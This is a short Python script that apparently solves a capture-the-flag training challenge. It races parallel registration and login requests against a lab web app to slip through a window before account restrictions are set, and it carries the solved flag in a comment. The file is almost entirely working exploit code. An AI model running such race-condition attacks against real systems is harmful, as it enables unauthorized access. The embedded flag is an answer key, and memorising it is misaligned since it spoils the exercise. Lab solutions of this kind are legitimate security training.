import requests
import threading
import random
import string

#flag{i_guess_you_were_fast_enough!}

HOST = "http://aart.training.jinblack.it"

#goal: getting the flag by exploiting a vulnerability caused by the fact that there is a window between the registration
#and the set of the restrictions for the new registered user (file login.php)

#for this, I need to make more attempts in order to exploit this window


#function to generate a random string in order to make more attempts
def randomString(N):
    return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=N))

#function in order to implement users' registration
def registration(user, password):
    url = "%s/register.php" % HOST
    r = requests.post(url, data={'username': user, 'password': password})

    #only return true if the registration was successful
    if "SUCCESS!" in r.text:
        return True
    return False

#function in order to implement users' login
def login(user, password):
    url = "%s/login.php" % HOST
    r = requests.post(url, data={'username': user, 'password': password})

    #I want to print all the text of the request only if the request exploited successfully the vulnerability
    #(it is not deterministic, it could happen sometimes and sometimes not)
    if "flag{" in r.text:
        print(r.text)



username = randomString(10)
password = randomString(10)

r = threading.Thread(target=registration, args=(username, password))
l = threading.Thread(target=login, args=(username, password))
r.start()
l.start()